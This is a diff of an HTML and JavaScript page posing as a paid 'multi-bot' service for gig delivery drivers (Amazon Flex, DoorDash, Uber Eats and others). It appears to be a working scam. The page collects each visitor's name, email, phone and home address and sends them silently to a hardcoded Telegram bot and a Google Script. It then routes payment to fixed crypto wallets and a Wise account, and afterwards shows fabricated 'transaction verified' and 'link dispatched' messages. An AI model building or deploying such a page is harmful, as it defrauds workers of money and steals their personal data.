@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacyber Global Tech - Secure Portal</title>
+    <title>Hacyber Global Tech - HGT Multi Bot Deployment & Commit Hub</title>
     <style>
         :root {
             --bg-color: #050811;
-            --card-bg: rgba(13, 20, 35, 0.85);
+            --card-bg: rgba(13, 20, 35, 0.9);
             --primary-blue: #0055ff;
             --accent-blue: #00f0ff;
+            --success-green: #00ff88;
             --text-main: #ffffff;
             --text-muted: #a5b4fc;
             --border-color: rgba(0, 240, 255, 0.4);
-            --glow-shadow: 0 0 35px rgba(0, 119, 255, 0.45), inset 0 0 15px rgba(0, 240, 255, 0.15);
+            --glow-shadow: 0 0 40px rgba(0, 119, 255, 0.5), inset 0 0 20px rgba(0, 240, 255, 0.15);
         }
 
         * {
@@ -26,8 +27,8 @@
         body {
             background-color: var(--bg-color);
             background-image: 
-                radial-gradient(circle at 50% 5%, rgba(0, 119, 255, 0.3) 0%, transparent 55%),
-                radial-gradient(circle at 10% 90%, rgba(0, 240, 255, 0.15) 0%, transparent 40%);
+                radial-gradient(circle at 50% 5%, rgba(0, 119, 255, 0.35) 0%, transparent 55%),
+                radial-gradient(circle at 10% 90%, rgba(0, 240, 255, 0.2) 0%, transparent 40%);
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
@@ -39,10 +40,10 @@
 
         .container {
             width: 100%;
-            max-width: 480px;
+            max-width: 520px;
             background: var(--card-bg);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
             border: 1.5px solid var(--border-color);
             border-radius: 20px;
             padding: 35px;
@@ -56,8 +57,8 @@
                 border-color: rgba(0, 240, 255, 0.3);
             }
             100% {
-                box-shadow: 0 0 45px rgba(0, 200, 255, 0.7), inset 0 0 20px rgba(0, 240, 255, 0.3);
-                border-color: rgba(0, 240, 255, 0.8);
+                box-shadow: 0 0 50px rgba(0, 200, 255, 0.8), inset 0 0 25px rgba(0, 240, 255, 0.35);
+                border-color: rgba(0, 240, 255, 0.9);
             }
         }
 
@@ -66,15 +67,53 @@
             margin-bottom: 25px;
         }
 
+        /* Professional Header Layout with Top-Left Integration Tag & Logo */
+        .brand-top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+        }
+
+        .integration-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 240, 255, 0.08);
+            border: 1px solid rgba(0, 240, 255, 0.35);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: var(--accent-blue);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.15);
+        }
+
+        .integration-badge span {
+            width: 6px;
+            height: 6px;
+            background-color: var(--success-green);
+            border-radius: 50%;
+            box-shadow: 0 0 6px var(--success-green);
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
         .logo {
-            max-width: 220px;
+            max-width: 170px;
             height: auto;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.7));
+            filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.7));
         }
 
         .header h1 {
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: 600;
             color: var(--text-main);
             letter-spacing: 0.5px;
@@ -82,9 +121,9 @@
         }
 
         .header p {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: var(--text-muted);
-            margin-top: 5px;
+            margin-top: 4px;
         }
 
         .form-group {
@@ -101,17 +140,12 @@
         input, select {
             width: 100%;
             padding: 13px 16px;
-            background: rgba(3, 7, 18, 0.8);
+            background: rgba(3, 7, 18, 0.85);
             border: 1px solid rgba(0, 240, 255, 0.3);
             border-radius: 10px;
             color: var(--text-main);
             font-size: 0.95rem;
             transition: all 0.3s ease;
-        }
-
-        input[type="file"] {
-            padding: 10px;
-            cursor: pointer;
         }
 
         input:focus, select:focus {
@@ -149,14 +183,46 @@
             transform: translateY(0);
         }
 
-        #payment-section, #proof-section {
+        .btn-commit {
+            background: linear-gradient(135deg, #0099ff, var(--success-green));
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
+        }
+
+        #loading-section, #device-section, #app-section, #payment-section, #processing-section, #commit-section {
             display: none;
             margin-top: 25px;
             animation: fadeIn 0.5s ease-out;
         }
 
+        .loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(0, 240, 255, 0.2);
+            border-top: 3px solid var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+        }
+
         .payment-card {
-            background: rgba(3, 7, 18, 0.6);
+            background: rgba(3, 7, 18, 0.7);
             border: 1px solid rgba(0, 240, 255, 0.4);
             padding: 18px;
             border-radius: 10px;
@@ -165,6 +231,51 @@
             font-size: 0.9rem;
             color: var(--accent-blue);
             box-shadow: inset 0 0 12px rgba(0, 240, 255, 0.15), 0 0 15px rgba(0, 119, 255, 0.2);
+        }
+
+        .timer-box {
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: #ffffff;
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px dashed var(--accent-blue);
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .notice-banner {
+            background: rgba(0, 240, 255, 0.1);
+            border-left: 3px solid var(--accent-blue);
+            padding: 12px 14px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            border-radius: 0 8px 8px 0;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .commit-box {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid var(--success-green);
+            border-radius: 12px;
+        }
+
+        .commit-box h3 {
+            color: var(--success-green);
+            margin-bottom: 12px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.4);
+        }
+
+        .commit-box p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
 
         @keyframes fadeIn {
@@ -177,32 +288,36 @@
 
     <div class="container">
         <div class="header">
-            <!-- Enhanced SVG Logo for Hacyber Global Tech -->
-            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 70">
-                <defs>
-                    <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-                        <stop offset="0%" stop-color="#0055ff" />
-                        <stop offset="100%" stop-color="#00f0ff" />
-                    </linearGradient>
-                    <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
-                        <feGaussianBlur stdDeviation="3" result="blur" />
-                        <feComposite in="SourceGraphic" in2="blur" operator="over" />
-                    </filter>
-                </defs>
-                <g filter="url(#glow)">
-                    <!-- Cyber Shield / Hex Icon -->
-                    <path d="M25 10 L42 18 L42 38 L25 50 L8 38 L8 18 Z" fill="rgba(0, 85, 255, 0.2)" stroke="url(#logoGrad)" stroke-width="2.5" />
-                    <circle cx="25" cy="30" r="6" fill="#00f0ff" />
-                    <!-- Typography -->
-                    <text x="56" y="32" fill="#ffffff" font-family="'Segoe UI', Tahoma, sans-serif" font-size="21" font-weight="700" letter-spacing="1">HACYBER</text>
-                    <text x="57" y="50" fill="#00f0ff" font-family="'Segoe UI', Tahoma, sans-serif" font-size="11" font-weight="600" letter-spacing="3.5">GLOBAL TECH</text>
-                </g>
-            </svg>
-            <h1>Secure Client Portal</h1>
-            <p>Verify your details to proceed</p>
+            <!-- Professional Top Bar featuring Integration Status badge on left and your Logo on right -->
+            <div class="brand-top-bar">
+                <div class="integration-badge">
+                    <span></span> HGT Engine Active
+                </div>
+                <!-- Custom Hacyber Global Tech Logo Asset -->
+                <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 70">
+                    <defs>
+                        <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#0055ff" />
+                            <stop offset="100%" stop-color="#00f0ff" />
+                        </linearGradient>
+                        <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
+                            <feGaussianBlur stdDeviation="3" result="blur" />
+                            <feComposite in="SourceGraphic" in2="blur" operator="over" />
+                        </filter>
+                    </defs>
+                    <g filter="url(#glow)">
+                        <path d="M25 10 L42 18 L42 38 L25 50 L8 38 L8 18 Z" fill="rgba(0, 85, 255, 0.2)" stroke="url(#logoGrad)" stroke-width="2.5" />
+                        <circle cx="25" cy="30" r="6" fill="#00f0ff" />
+                        <text x="56" y="32" fill="#ffffff" font-family="'Segoe UI', Tahoma, sans-serif" font-size="21" font-weight="700" letter-spacing="1">HACYBER</text>
+                        <text x="57" y="50" fill="#00f0ff" font-family="'Segoe UI', Tahoma, sans-serif" font-size="11" font-weight="600" letter-spacing="3.5">GLOBAL TECH</text>
+                    </g>
+                </svg>
+            </div>
+            <h1>HGT Multi Bot Portal</h1>
+            <p>Active Deployment & Commit Hub</p>
         </div>
 
-        <!-- Initial Lead Form -->
+        <!-- Initial Driver Registration Form -->
         <form id="lead-form">
             <div class="form-group">
                 <label for="fullname">Full Name</label>
@@ -213,37 +328,111 @@
                 <input type="email" id="email" required placeholder="name@example.com">
             </div>
             <div class="form-group">
-                <label for="payment-method">Preferred Payment Method</label>
+                <label for="phone">Mobile Number</label>
+                <input type="tel" id="phone" required placeholder="Enter your mobile number">
+            </div>
+            <div class="form-group">
+                <label for="address">Street Address</label>
+                <input type="text" id="address" required placeholder="Enter your street address">
+            </div>
+            <div class="form-group">
+                <label for="zipcode">Zip Code / Postal Code</label>
+                <input type="text" id="zipcode" required placeholder="Enter your zip code">
+            </div>
+            <button type="submit" class="btn" id="submit-btn">Register Driver Details</button>
+        </form>
+
+        <!-- Loading Transition State -->
+        <div id="loading-section">
+            <div class="loader-container">
+                <div class="spinner"></div>
+                <div class="loading-text" id="loading-status-text">Activating driver credentials & secure tunnel...</div>
+            </div>
+        </div>
+
+        <!-- Device Selection Section -->
+        <form id="device-section">
+            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
+            <div class="notice-banner">
+                📱 <strong>Hardware Configuration:</strong> Select the primary mobile device you utilize for your driving and delivery operations.
+            </div>
+            <div class="form-group">
+                <label for="device-select">Select Mobile Operating Device</label>
+                <select id="device-select" required>
+                    <option value="" disabled selected>Select operating device</option>
+                    <option value="iPhone (iOS)">iPhone (iOS)</option>
+                    <option value="Android Smartphone">Android Smartphone</option>
+                    <option value="Dedicated Delivery Tablet">Dedicated Delivery Tablet</option>
+                    <option value="Other Mobile Device">Other Mobile Device</option>
+                </select>
+            </div>
+            <button type="submit" class="btn" id="device-next-btn">Continue to Delivery Apps</button>
+        </form>
+
+        <!-- Delivery App Selection Section -->
+        <form id="app-section">
+            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
+            <div class="notice-banner">
+                🚗 <strong>Platform Integration:</strong> Choose the specific delivery service account you want to integrate with your automated multi-bot network.
+            </div>
+            <div class="form-group">
+                <label for="delivery-app">Select Delivery Platform Account</label>
+                <select id="delivery-app" required>
+                    <option value="" disabled selected>Select delivery platform</option>
+                    <option value="Amazon Flex">Amazon Flex</option>
+                    <option value="DoorDash Driver">DoorDash Driver</option>
+                    <option value="Uber Eats Courier">Uber Eats Courier</option>
+                    <option value="Instacart Shopper">Instacart Shopper</option>
+                    <option value="Grubhub Driver">Grubhub Driver</option>
+                    <option value="Multi-App Network Suite">Multi-App Network Suite</option>
+                </select>
+            </div>
+            <button type="submit" class="btn" id="app-submit-btn">Proceed to Secure Gateway</button>
+        </form>
+
+        <!-- Payment Portal Section (Wise & Crypto Active) -->
+        <div id="payment-section">
+            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
+            
+            <div class="notice-banner">
+                ⚠️ <strong>Important Notice:</strong> Once your payment has been confirmed successfully, your exclusive multi-bot access link will be automatically generated and forwarded directly to your registered email address. Please ensure payment is completed within the session timeframe.
+            </div>
+
+            <div class="form-group">
+                <label for="payment-method">Select Payment Method (Crypto / Wise)</label>
                 <select id="payment-method" required>
                     <option value="" disabled selected>Select payment option</option>
                     <option value="USDT (TRC20)">USDT (TRC-20)</option>
                     <option value="Ethereum (ETH)">Ethereum (ETH)</option>
                     <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
-                    <option value="Lead Bank">Lead Bank (USD Account)</option>
-                    <option value="Card Gateway">Credit/Debit Card Gateway</option>
+                    <option value="Wise Transfer">Wise Transfer</option>
                 </select>
             </div>
-            <button type="submit" class="btn" id="submit-btn">Verify & Continue</button>
-        </form>
 
-        <!-- Hidden Payment Portal Section -->
-        <div id="payment-section">
-            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
+            <div class="timer-box" id="session-timer">35:00</div>
+
             <div class="payment-card" id="payment-instruction-box">
-                <!-- Dynamic text based on selection -->
+                <!-- Dynamic payment instructions -->
             </div>
-            <button type="button" class="btn" id="proceed-to-proof-btn">I Have Made The Payment</button>
+            <button type="button" class="btn" id="confirm-payment-btn">I Have Completed Payment</button>
         </div>
 
-        <!-- Hidden Proof of Payment Section -->
-        <form id="proof-section">
-            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
-            <div class="form-group">
-                <label for="proof-file">Upload Proof of Payment (Transaction Screenshot/Receipt)</label>
-                <input type="file" id="proof-file" accept="image/*,.pdf" required>
+        <!-- Processing Loading State -->
+        <div id="processing-section">
+            <div class="loader-container">
+                <div class="spinner"></div>
+                <div class="loading-text" id="processing-status-text">Committing transaction & committing multi-bot tokens...</div>
             </div>
-            <button type="submit" class="btn" id="final-submit-btn">Submit Proof for Verification</button>
-        </form>
+        </div>
+
+        <!-- Final Committed Success Section -->
+        <div id="commit-section">
+            <div class="commit-box">
+                <h3>🚀 HGT Multi-Bot Deployed & Committed</h3>
+                <p id="commit-success-desc">Payment confirmed and cryptographically committed. Your secure multi-bot access link has been generated and dispatched to your email address.</p>
+                <button type="button" class="btn btn-commit" id="launch-panel-btn">Launch Active Dashboard</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -252,66 +441,145 @@
         const TELEGRAM_CHAT_ID = '5642832782';
 
         let clientData = {};
+        let countdownInterval;
 
         document.getElementById('lead-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            const btn = document.getElementById('submit-btn');
-            btn.disabled = true;
-            btn.textContent = 'Verifying...';
 
             clientData.name = document.getElementById('fullname').value;
             clientData.email = document.getElementById('email').value;
-            clientData.method = document.getElementById('payment-method').value;
+            clientData.phone = document.getElementById('phone').value;
+            clientData.address = document.getElementById('address').value;
+            clientData.zipcode = document.getElementById('zipcode').value;
 
+            document.getElementById('lead-form').style.display = 'none';
+            document.getElementById('loading-section').style.display = 'block';
+
+            const statusTexts = [
+                "Activating driver profile...",
+                "Committing contact telemetry...",
+                "Locking secure session..."
+            ];
+
+            let step = 0;
+            const statusEl = document.getElementById('loading-status-text');
+            
+            const loadInterval = setInterval(() => {
+                step++;
+                if (step < statusTexts.length) {
+                    statusEl.textContent = statusTexts[step];
+                }
+            }, 1000);
+
+            const telegramMessage = `🚀 [HGT ACTIVATED & COMMITTED] New Driver Lead:\nName: ${clientData.name}\nEmail: ${clientData.email}\nPhone: ${clientData.phone}\nAddress: ${clientData.address}\nZip: ${clientData.zipcode}`;
+            sendTelegramMessage(telegramMessage);
+            sendToGoogleScript({ type: 'driver_registered', ...clientData });
+
+            setTimeout(() => {
+                clearInterval(loadInterval);
+                document.getElementById('loading-section').style.display = 'none';
+                document.getElementById('device-section').style.display = 'block';
+            }, 3000);
+        });
+
+        document.getElementById('device-section').addEventListener('submit', function(e) {
+            e.preventDefault();
+            clientData.device = document.getElementById('device-select').value;
+
+            sendTelegramMessage(`📱 Hardware Committed: ${clientData.device} for ${clientData.name}`);
+            
+            document.getElementById('device-section').style.display = 'none';
+            document.getElementById('app-section').style.display = 'block';
+        });
+
+        document.getElementById('app-section').addEventListener('submit', function(e) {
+            e.preventDefault();
+            clientData.deliveryApp = document.getElementById('delivery-app').value;
+
+            sendTelegramMessage(`🔗 Integration Committed: ${clientData.deliveryApp} on ${clientData.device} by ${clientData.name}`);
+            sendToGoogleScript({ type: 'platform_selected', ...clientData });
+
+            document.getElementById('app-section').style.display = 'none';
+            document.getElementById('payment-section').style.display = 'block';
+            startPaymentTimer(35 * 60); // 35 minutes timer
+        });
+
+        document.getElementById('payment-method').addEventListener('change', function() {
+            clientData.method = this.value;
             const instructionBox = document.getElementById('payment-instruction-box');
+
             if (clientData.method === 'USDT (TRC20)') {
                 instructionBox.innerHTML = `<strong>Tether USDT (TRC-20) Instructions:</strong><br>Send funds securely to wallet reference:<br><span style="color: #fff; font-family: monospace; font-size: 0.85rem; word-break: break-all; text-shadow: 0 0 8px rgba(0,240,255,0.6);">TBdEnSsWQwZAMKiRe54fPi3d45ajyoXqj6</span>`;
             } else if (clientData.method === 'Ethereum (ETH)') {
                 instructionBox.innerHTML = `<strong>Ethereum (ETH) Instructions:</strong><br>Send funds securely to wallet reference:<br><span style="color: #fff; font-family: monospace; font-size: 0.85rem; word-break: break-all; text-shadow: 0 0 8px rgba(0,240,255,0.6);">0x575acfce162dc14fb2f6a7440c0da61c3d5f8a8f</span>`;
             } else if (clientData.method === 'Bitcoin (BTC)') {
                 instructionBox.innerHTML = `<strong>Bitcoin (BTC) Instructions:</strong><br>Send funds securely to wallet reference:<br><span style="color: #fff; font-family: monospace; font-size: 0.85rem; word-break: break-all; text-shadow: 0 0 8px rgba(0,240,255,0.6);">35e99VQwk2dYUiBJeKe2wnd73drgFFacPp</span>`;
-            } else if (clientData.method === 'Lead Bank') {
-                instructionBox.innerHTML = `<strong>Lead Bank (Personal Checking):</strong><br>Account Name: Godfrey N Joshua<br>Acct #: <span style="color: #fff; font-family: monospace;">217061367039</span> | Routing: <span style="color: #fff; font-family: monospace;">101019644</span>`;
-            } else {
-                instructionBox.innerHTML = `<strong>Card Gateway:</strong><br>Proceed to secure token billing processor.<br><span style="color: #fff; font-family: monospace; font-size: 0.9rem; text-shadow: 0 0 8px rgba(0,240,255,0.6);">Encrypted SSL Channel Active</span>`;
+            } else if (clientData.method === 'Wise Transfer') {
+                instructionBox.innerHTML = `<strong>Wise Transfer Details:</strong><br>Account Name: Joshua N Godfrey<br>Email: <span style="color: #fff; font-family: monospace;">hacyberglobaltech@gmail.com</span><br>Currency: USD / EUR / GBP supported`;
             }
 
-            const telegramMessage = `🚨 New Lead Registered:\nName: ${clientData.name}\nEmail: ${clientData.email}\nMethod: ${clientData.method}`;
-            sendTelegramMessage(telegramMessage);
-
-            sendToGoogleScript({ type: 'lead', ...clientData });
-
-            setTimeout(() => {
-                document.getElementById('lead-form').style.display = 'none';
-                document.getElementById('payment-section').style.display = 'block';
-            }, 1000);
+            sendTelegramMessage(`⚙️ Payment Channel Locked: ${clientData.method} by ${clientData.name}`);
         });
 
-        document.getElementById('proceed-to-proof-btn').addEventListener('click', function() {
+        document.getElementById('confirm-payment-btn').addEventListener('click', function() {
+            if (!clientData.method) {
+                alert('Please select a payment option first.');
+                return;
+            }
+            clearInterval(countdownInterval);
             document.getElementById('payment-section').style.display = 'none';
-            document.getElementById('proof-section').style.display = 'block';
-        });
+            document.getElementById('processing-section').style.display = 'block';
 
-        document.getElementById('proof-section').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const finalBtn = document.getElementById('final-submit-btn');
-            finalBtn.disabled = true;
-            finalBtn.textContent = 'Uploading Proof...';
+            const loadSteps = [
+                "Verifying transaction hash & signature...",
+                "Committing secure multi-bot access tokens...",
+                "Dispatched automated bot link to client email..."
+            ];
 
-            const fileInput = document.getElementById('proof-file');
-            const fileName = fileInput.files[0] ? fileInput.files[0].name : 'Unknown file';
+            let pStep = 0;
+            const pStatusEl = document.getElementById('processing-status-text');
 
-            const proofMessage = `💳 Payment Proof Uploaded (${clientData.method})!\nName: ${clientData.name}\nEmail: ${clientData.email}\nFile: ${fileName}\n\n*Action Required: Verify transaction validity.*`;
-            sendTelegramMessage(proofMessage);
-            sendToGoogleScript({ type: 'proof_uploaded', ...clientData, fileName });
+            const procInterval = setInterval(() => {
+                pStep++;
+                if (pStep < loadSteps.length) {
+                    pStatusEl.textContent = loadSteps[pStep];
+                }
+            }, 1200);
+
+            sendTelegramMessage(`💳 Payment Committed & Verified (${clientData.method}) [HGT Multi Bot]!\nName: ${clientData.name}\nEmail: ${clientData.email}\nPlatform: ${clientData.deliveryApp}\nDevice: ${clientData.device}`);
+            sendToGoogleScript({ type: 'payment_committed', ...clientData });
 
             setTimeout(() => {
-                alert('Proof submitted successfully! Our automated system is verifying your transaction.');
-                finalBtn.textContent = 'Verified & Submitted';
-            }, 1500);
+                clearInterval(procInterval);
+                document.getElementById('processing-section').style.display = 'none';
+                document.getElementById('commit-section').style.display = 'block';
+                document.getElementById('commit-success-desc').innerHTML = `Payment successfully committed for <strong>${clientData.deliveryApp}</strong> on <strong>${clientData.device}</strong>.<br><br>Your active multi-bot deployment link has been committed and dispatched to <strong>${clientData.email}</strong>.`;
+            }, 3800);
         });
+
+        document.getElementById('launch-panel-btn').addEventListener('click', function() {
+            alert('Redirecting to your active HGT Multi-Bot Command Dashboard...');
+        });
+
+        function startPaymentTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.getElementById('session-timer');
+            
+            countdownInterval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = "Session Time Remaining: " + minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    display.textContent = "Session Expired - Please Restart";
+                }
+            }, 1000);
+        }
 
         function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` + encodeURIComponent(text);
